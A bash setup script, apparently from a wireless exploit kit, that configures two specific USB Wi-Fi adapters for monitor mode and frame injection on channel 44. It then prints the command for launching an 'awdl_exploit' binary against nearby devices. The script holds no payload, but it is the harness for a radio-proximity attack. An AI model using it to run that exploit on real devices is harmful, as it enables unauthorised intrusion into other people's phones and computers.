#!/bin/bash

if [[ $(id -u) -ne 0 ]] ; then echo "Please run as root" ; exit 1 ; fi

echo "killing interfering processes..."
airmon-ng check kill

echo "disabling rfkill..."
rfkill unblock all

MONITOR_INTERFACE=$(airmon-ng | egrep "rtl88XXau" | cut -f 2)

if [ -z "$MONITOR_INTERFACE" ]
    then
    echo "can't find monitor interface, please ensure an rtl88XXau device is plugged in (eg ZyXEL NWD6605)"
    exit 1
fi

echo "found rtl88XXau device: $MONITOR_INTERFACE"

INJECTION_INTERFACE=$(airmon-ng | egrep "mt76x2u" | cut -f 2)

if [ -z "$INJECTION_INTERFACE" ]
    then
    echo "can't find injection interface, please ensure an mt76x2u device is plugged in (eg NETGEAR A6210)"
    exit 1
fi

echo "found mt76x2u device: $INJECTION_INTERFACE"


#ACTIVE_MONITOR_INTERFACE=$(airmon-ng | egrep "mt76x2u" | cut -f 2)

#if [ -z "$ACTIVE_MONITOR_INTERFACE" ]
#    then
#    echo "can't find active monitor interface, please ensure an mt76x2u device is plugged in (eg NETGEAR A6210)"
#    exit 1
#fi

ACTIVE_MONITOR_PHY=$(airmon-ng | egrep "mt76x2u" | cut -f 1)

if [ -z "$ACTIVE_MONITOR_PHY" ]
    then
    echo "can't find active monitor phy, please ensure an mt76x2u device is plugged in (eg NETGEAR A6210)"
    exit 1
fi

echo "found mt76x2u phy: $ACTIVE_MONITOR_PHY for active monitor"

# set up the monitor interface:
ip link set dev $MONITOR_INTERFACE down
iw dev $MONITOR_INTERFACE set type monitor
ip link set $MONITOR_INTERFACE up
iw dev $MONITOR_INTERFACE set channel 44

# set up the injection and active monitor interface:
ip link set dev $INJECTION_INTERFACE down
iw dev $INJECTION_INTERFACE set type monitor
iw dev $INJECTION_INTERFACE set monitor active control otherbss
ip link set dev $INJECTION_INTERFACE up
iw dev $INJECTION_INTERFACE set channel 44

echo "devices configured, run the exploit with these arguments:"
echo "sudo nice -n -20 ./awdl_exploit $INJECTION_INTERFACE $MONITOR_INTERFACE $ACTIVE_MONITOR_PHY 22:22:33:33:44:44 123.123.123.123"
